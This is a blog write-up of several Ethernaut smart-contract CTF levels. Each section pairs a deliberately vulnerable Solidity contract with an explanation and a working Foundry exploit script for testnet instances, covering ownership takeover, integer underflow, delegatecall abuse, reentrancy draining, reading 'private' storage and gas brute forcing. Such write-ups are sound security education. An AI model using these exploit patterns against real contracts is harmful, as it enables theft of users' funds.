---
layout: default
title: "Ethernaut Challenges WriteUps "
# date: 2025-09-16
categories: ctf Blockchain Solidity
---

**Easy access :** [Fallback](#fallback) . [Fal1out](#fal1out) . [CoinFlip](#coinflip) . [Telephone](#telephone) . [Token](#token) . [Delegation](#delegation) . [Force](#force) . [Vault](#vault) . [King](#king) . [Re-entrancy](#re-entrancy) . [Privacy](#privacy) . [GatekeeperOne](#gatekeeperone)

---

# #Fallback

**Challenge:** Claim ownership of the contract and reduce contract's balance to 0.

**Contract** 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
In this contract , the contract is changing it's owner in three different places: 
- `owner = msg.sender;` in the constructor 
- `owner = msg.sender;` in the contribute function 
- `owner = msg.sender;` in the receive function 

So I can become owner from any one of these .

1. Using constructor ❌
2. Using contribute function -> yes I can become the owner but for that I need to add more contributions than the current owner and I cannot do it once . I can only add less than 0.001 ether to our contributions at once. So to become owner I should repeat adding contributions with ether less than `0.001` untill I become owner. So it is time consuming and high cost as it needs many transcations. 
so using contribute function ❌.
1. using Receive function ? Let's see..

In receive I have require and I need to pass that to become owner. To pass this , I need contributions > 0 and msg.value > 0 . 

`receive` is called when I send ETH to the contract without any data , so I call it by sending some ETH (greater than 0) to the contract but before that  I do one contribution to the contract so that contributions will be greater than 0 . 

receive triggered -> require passed -> and I will become The OWNER . 

**Here's the Foundry script that solves the challenge**

```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/Level01.sol";
import {Script , console} from "forge-std/Script.sol";

contract Level01Solution is Script{

    Fallback fallbackInstance = Fallback(payable(0x176876a12E75801Dd798B0464F040eBdF6139469)); //place Instance address  

    function run() external {
        vm.startBroadcast();

        fallbackInstance.contribute{value: 1 wei}();

        (bool success , )=address(fallbackInstance).call{value: 0.0001 ether}("");
        require(success, "Call failed");
        console.log("NewOwner: ", fallbackInstance.owner());
        console.log("my Address:", vm.envAddress("ADDRESS"));
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }

}
```


---

# #Fal1out

**challenge :** Claim the ownership of the contract .

**contract** 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```
**Tip : While Trying to Hack the contract or Exploting the contract you and I should doubt everything that looks weired.**

When I saw the contract it's version looked weired for me , I was like whyy..? why ^0.6.0 version ?? 

with that question in my mind , I moved into the contract 

In the contract I have a function `Fal1out` but it is commented as Constructor and it is weired right ?

So after sometime I came to know that in the older versions there is no constructor keyword ,  If the function in a contract has name exactly as the contract's name then it is considered as constructor.

But in our contract the fuction commented as constructor is not a constructor because the names are not exactly same `Fallout` & `Fal1out`.
so using that , I can claim the ownership by just calling that function with some ETH .

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import {Fallout} from "../src/Fal1out.sol";
import {Script } from "forge-std/Script.sol";


contract Fal1outSolution  is Script{

    Fallout falloutInstance = Fallout(payable(0x24a9926C6311c62956efb3d501BAf72D4eb444d8));

    function run() public payable {
        vm.startBroadcast();
        falloutInstance.Fal1out{value : msg.value}();
        vm.stopBroadcast();
    }
}
```
---
# #CoinFlip 

**Challenge :** I need to build up our winning streak by guessing the outcome of a coin flip. That is I need to guess the correct outcome of a coin 10 times in a row .

**Contract**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
Here Vulnerability lies in the line `uint256 blockValue = uint256(blockhash(block.number - 1));`

The Ethereum Virtual Machine (EVM) provides access to the block hashes of the 256 most recent blocks, excluding the current block. This means that when our `flip()` function is called in block N, the `blockhash(block.number - 1)` will be the hash of block N-1, which has already been mined and is publicly known on the blockchain.

So I know `blockValue` and `FACTOR` --> the side of a coin is **predictable**. 

To solve the challenge  I need to calculate (as same as CoinFlip contract) the side of the coin using previous block hash and then call `flip` function using calculated side of coin.(calculating and calling should be in the same TX).

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {CoinFlip} from "../src/CoinFlip.sol";
import {Script } from "forge-std/Script.sol";
import "forge-std/console.sol";


contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(CoinFlip _coinflipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        _coinflipInstance.flip(side);
    }
}
contract CoinFlipSolution is Script{

    CoinFlip coinflipInstance = CoinFlip(0x87d21355195d253C9fEED5941E91440C67c98746);
    
    function run() public payable {
        vm.startBroadcast();
        new Player(coinflipInstance);
        console.log("Consecutive Wins: ", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
```
I ran the following command 10 times in the terminal , everytime I run consecutive wins increase .
```terminal
forge script script/CoinFlipSolution.s.sol:CoinFlipSolution --private-key $PRI
VATE_KEY --rpc-url $SEPOLIA_RPC_URL --broadcast
```

---
# #Telephone

**Challenge :** Claim ownership of the contract.

**Contract**

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
`tx.origin` -> It always returns the EOA (Externally Owned Account) who initiated the TX.

So with this thing I can solve the challenge using the followig foundry script 

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";
import {console} from "forge-std/console.sol";

contract Attack {

    constructor (Telephone _telephone , address _newOwner) {
        _telephone.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {
    
    Telephone telephone = Telephone(0x0a75A78330f44276dF198d1AF2Ebb2b6b2f38a8a); // instance
    
    function run() public {
       vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
       console.log("Current owner:", telephone.owner());
         new Attack(telephone, vm.envAddress("ADDRESS"));
         console.log("New owner:", telephone.owner());
       vm.stopBroadcast();
    }

}
```
---

# #Token

**Challenge :** I need to get your hands on any additional tokens. Preferably a very large amount of tokens.

Initially I was given 20 tokens.

**Contract**
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

In older EVM versions there is no default type checking for `Overflows` and `Underflows` , So they Wrap around.

In my case the Vulnerability lies in this line `require(balances[msg.sender] - _value >= 0);` . If the value is `21`  ,
20-21 = -1 --> uint256 cannot have negative values --> wraps to the max of uint256 . ( that's the huge amount of tokens I am going to get ). And my balance will be max of uint256 and the `to` address gets 21 tokens . And challenge Solved !.

**Here's the Foundry script that solves the challenge**
```Foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Token} from "../src/Token.sol";
import "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";

contract TokenSolution is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);
        console.log("address of attacker: " , attacker);

        vm.startBroadcast(privateKey);
        Token token = Token(0x61a83C282BFF4Ed900a7ad77024633f032285EAC);//instance address
        token.transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 , 21);//to address
        vm.stopBroadcast();

        uint256 balance = token.balanceOf(attacker);
        console.log("Attacker address: ", attacker);
        console.log("Balance after exploit: ", balance);
        console.log(address(msg.sender));
    }
}
```
---

# #Delegation

**Challenge :** Claim the ownership of the Instance (Delegation contract).

**Contract** 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```
This contract uses `delegatecall` in the fallback function to call the Delegate contract . 
`delegatecall` will maintain original `msg.sender` and `mag.value` , but executes in the **caller's storage context** . 
so calling `pwn` through the Delegation contract will trigger `fallback` , that calls `pwn` in the Delegate contract and that changes the `owner` variable of the Delegation contract -> makes msg.sender (us) as owner.

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Delegation} from "../src/Delegation.sol";
import "forge-std/console.sol";

contract DelegationSolution  is Script{

    function run() public {
        Delegation delegation = Delegation(0xd8bf6b90C8Fd31463f4473F16A0EabFD8c24AAd9); //instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);
        console.log(delegation.owner());
        vm.startBroadcast(attacker);
        (bool success , ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "not hacked");
        vm.stopBroadcast();
        console.log(delegation.owner());

    }
}
```
---

# #Force

**Challenge :** I need to make the balance of the contract greater than zero .

**Contract**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
A contract can receive ETH force fully even without `receive` or `fallback` functions using `selfdestruct`.

so I sent ether to the contract by self destroying . 

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import {Force} from "../src/Force.sol";

contract ForceSolution is Script {

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);
        vm.startBroadcast(attacker);
        new Intermediatary{value : 1 wei }(payable(0xAc5932516eef108D74f97b485331F1bCc4D83Be6)); //instance address
    }
}

contract Intermediatary{
    constructor(address payable _forceAddress) payable{
        selfdestruct(_forceAddress);
    }
}
```
---

# #Vault

**Challenge :** I should unlock the vault to pass the level i.e., I should make `locked` variable false.

**Contract**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```
That private variable `password` is actually not private or secret , in blockchain world everything is on chain and anyone can see it . 

So I just need to read that password and call the unlock with that password .

**Reading the variables** using cast in foundry
```terminal
cast storage /*paste instance address*/ 1 --rpc-url $SEPOLIA_RPC_URL 
```
Run this in the terminal , this will print the password , copy it .

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script } from "forge-std/Script.sol";
import "forge-std/console.sol";
import {Vault} from "../src/Vault.sol";

contract VaultSolution is Script {
    Vault vaultInstance = Vault(0x697f2E42d0fa862F27Dd3Fbc7741d08611123081); //instance address

    function run() external {
        console.log(vaultInstance.locked());
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vaultInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29); // passwrord
        vm.stopBroadcast();
        console.log(vaultInstance.locked());
}
    
}
```
**TIP : We should hash the private variables before storing them on chain .**

---

# #King

**Challenge :** I need to restrict or stop the initial onwer from becoming owner again when I submit the instance 

**Contract** 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
1. I can become the new `king` by sending ether greater than the `prize` to the contract.
2. But when I submit the instance the initial owner tries to become the `king` again my sending the ether to current king . This is what I need to stop to hack this contract.
3. when the initial owner sends `prize` to current king (me) , `fallback` or `receive` is triggered and 
what if I place nothing but `revert` in those functions . Means I restricted initial king from gaining Kingship again.

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import {King} from "../src/King.sol";

contract AttackKing {
    King public kingInstance;
    
    constructor(address _kingAddress) {
        kingInstance = King(payable(_kingAddress));
    }

    function attack() external payable {
        require(msg.value > kingInstance.prize(), "Not enough Ether sent");
        (bool success, ) = address(kingInstance).call{value: msg.value}("");
        require(success, "Attack failed");
    }
    
    // Add receive function to prevent becoming king
    receive() external payable {
        revert("you cannot become the king after me !");
    }
}

contract KingSolution is Script {
    address public constant KING_ADDRESS = 0x21Db1389ee2685588750B87f98684490219e6948;
    
    function run() public {

        console.log("old King Address:",  King(payable(KING_ADDRESS))._king());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        AttackKing attackKing = new AttackKing(KING_ADDRESS);
        
        uint256 currentPrize = King(payable(KING_ADDRESS)).prize();
        console.log("Current Prize:", currentPrize);
        
        attackKing.attack{value: currentPrize + 0.001 ether}();
        
        vm.stopBroadcast();
        
        address currentKing = King(payable(KING_ADDRESS))._king();
        console.log("New King:", currentKing);
    }
}
```
One and only king - ME -lol

---

# #Re-entrancy

**Challenge :** I need to steal all the funds from the contract.

**Contract**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```
This is a basic attack in the Web3 space where the attacker Re-enters / re-calls the withdraw funds function before updating the state . 

We should avoid this by following CEI (CHECKS - EFFECTS - INTERACTIONS).

Any contract especially that deals with the fund TX's need to follow this CEI standard if not we can steal all the funds from that contract as follows 

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "../src/Re-entrancy.sol";
import { Script } from "forge-std/Script.sol";
import { console } from "forge-std/console.sol";

contract Attack{
    Reentrance reentrance;
    constructor(Reentrance _reentrance) public {
        reentrance = _reentrance;
    }

    function _donate() external payable{
        reentrance.donate{value: msg.value}(address(this));
    }

    function _withdraw(uint256 _amount) external {
        reentrance.withdraw(_amount);
    }

    // function _balanceOf() internal view returns(uint256){
    //     return reentrance.balanceOf(address(reentrance));
    // }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            uint256 amount = msg.value; // keep withdrawing same chunk
            if (amount > address(reentrance).balance) {
                amount = address(reentrance).balance;
            }
            reentrance.withdraw(amount);
        }
}
}

contract ReentrancySolution is Script {
    Reentrance reentrance = Reentrance(0x73a140e2c386C2c308b38cDB44823d35cb380a5B);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attack = new Attack(reentrance);

        console.log("Balance of attacker: ", address(attack).balance);
        console.log("Balance of contract: ", address(reentrance).balance);

        
        attack._donate{value: 0.001 ether}();
        attack._withdraw(0.001 ether);

        console.log("Balance of attacker: ", address(attack).balance);
        console.log("Balance of contract: ", address(reentrance).balance);
        vm.stopBroadcast();
    }
}
```
**TIP : Better use CEI or Re-entrancy guards from Openzeppelin**

---

# #Elevator

**Challenge :** I should reach the top floor of the building , i.e., I should make `top` variable **True** 

**Contract**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
The `goTo()` function calls an external contract (through an interface called Building) to check `isLastFloor()` and this `isLastFloor()` is called twice in the function `goTo()` (Vulnerability lies here).
To reach the top, the first call should return false, and the second should return true .

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "../src/Elevator.sol";
import { Script } from "forge-std/Script.sol";
import { console } from "forge-std/console.sol";
import { Building } from "../src/Elevator.sol";



contract Attack is Building {

    Elevator elevator ;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }


    bool isSecondCall = false;

    function attack(uint256 _floor) external {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint256 /*_floor*/) external override returns(bool){
        if(!isSecondCall){
            isSecondCall = true;
            return false;
        }else{
            return true;
        }
        
        
    }

}


contract ElevatorSolution is Script{

    Elevator elevator = Elevator(0x7592cB658E5F1a35Df01E932A7E9A4e45a46Cfd1);

    function run () external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(address(elevator));
        attack.attack(1);

        console.log("Elevator is at floor: ", elevator.floor());
        console.log("Is top floor: ", elevator.top());
        vm.stopBroadcast();
    }

}
```

# #Privacy

**Challenge :** I need to unlock this contract to beat the level , for that I should make  `locked` variable **false** .

**COntract** 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```
The contract has a variable `bytes32 private data` (or password) as `private`, but `private` only **hides it from other contracts in Solidity — it does NOT hide the value from on-chain storage**.

So I just read `bytes32 data` from the publicly available storage slots then call the contract’s `unlock(bytes32)` function with that value.

Reading the data from storage using cast - foundry
```terminal
cast storage /*Place instance address here*/ 5 --rpc-url $SEPOLIA_RPC_URL
``` 

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Privacy } from "../src/Privacy.sol";
import { Script } from "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacySolution is Script{
    Privacy privacyInstance = Privacy(0x3F8F66bF12cb8f2fB2a8ECB82BB3d12195f447F9);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Locked status before unlock: ", privacyInstance.locked());
        privacyInstance.unlock(0x5e890ce38f2645794e5eaf9b8301ce36);
        console.log("Locked status after unlock: ", privacyInstance.locked());
        vm.stopBroadcast();
    }
}

// await web3.eth.getStorageAt(instance, 5) 
// '0x5e890ce38f2645794e5eaf9b8301ce36ab58af4144ff4bb5661a26c4b58ee43b'
// bytes16(0x5e890ce38f2645794e5eaf9b8301ce36ab58af4144ff4bb5661a26c4b58ee43b) = 0x5e890ce38f2645794e5eaf9b8301ce36
```
**TIP : Hash the sensitive data before storing them on chain**

---

# #GateKeeperOne 

**Challenge :** I need to become an **entrant** in this contract , but for that I should to pass three gates ( Modifiers )

**Contract** 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
`gateOne` -> I can easily pass it as I have done it earlier in **Telephone** contract . 

**How to pass `gateTwo` ?** 
Let's see 

`gasleft()` returns the remaining gas left in the current execution context. I need that to be multiple of **8191** . So I use low level **call** function where I can specify the gas , I send gas amount as multiples of **8191** so that `gasleft() % 8191 == 0` satifies. But gas usage depends on many factors like EVM version , Network Conditions and many more , so I cannot be sure that `gasleft()` in the modifier returns exactly multiple of 8191. So I felt better to use `for` loop to send 8191 multiples gas amount repeatedly and somewhere `gasleft` returns exact multiple of **8191**.

Like this I can pass this modifier .

**What about `gateTree(bytes8 _gateKey)` ?**

To pass this I need to understand , how EVM handles comparisons of same types , differ in sizes . And I have understood them and that made me to pass this modifier .

The parameter **_gateKey** should be like 0xXXXXXXX(any number other than 0) 0000 _ _ _ _ . The first 7 chars can be ny number  , eighth char can be any number other than zero , 9, 10 ,11, 12 chars should be zero , and then last 4 should be the last four chars of address of `tx.origin`.

for example : bytes8 _gateKey = **`0x0000000100006c17`** where tx.origin is `0xC6EDD10e757f88da71DE403BB5f8De15538e6C17`.

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Idenifier: MIT
pragma solidity ^0.8.0;
import {Script} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import {console} from "forge-std/console.sol";

contract Attack {
    GatekeeperOne public gatekeeper ;

    constructor (GatekeeperOne _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

   function exploit(bytes8 _key) public {
    for (uint256 i = 0; i < 8191; i++) {
        (bool success,) = address(gatekeeper).call{gas: 8191 * 10 + i}(
            abi.encodeWithSignature("enter(bytes8)", _key)
        );
        if (success) {
            // Found the correct gas offset
            break;
        }
    }
}
    
}

contract GatekeeperSolution is Script {
    
    GatekeeperOne gatekeeperOne = GatekeeperOne(0x9262e95bC9612a968F9Ab46Bd8B155816A32eECA); // instance address
    
    function run() public {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);

        console.log("Attacker address:", attacker);

        uint16 last16 = uint16(uint160(attacker));
        bytes8 gateKey = bytes8(uint64(last16) | (uint64(1) << 32));
        console.logBytes8(gateKey);

        vm.startBroadcast(attackerPrivateKey);

        Attack attack = new Attack(gatekeeperOne);

        attack.exploit(gateKey);
        
        vm.stopBroadcast();
        
        // Verify the attack was successful
        require(gatekeeperOne.entrant() == attacker, "Attack failed");
        console.log("Success! Entrant is now:", gatekeeperOne.entrant());

    }

}
```

---
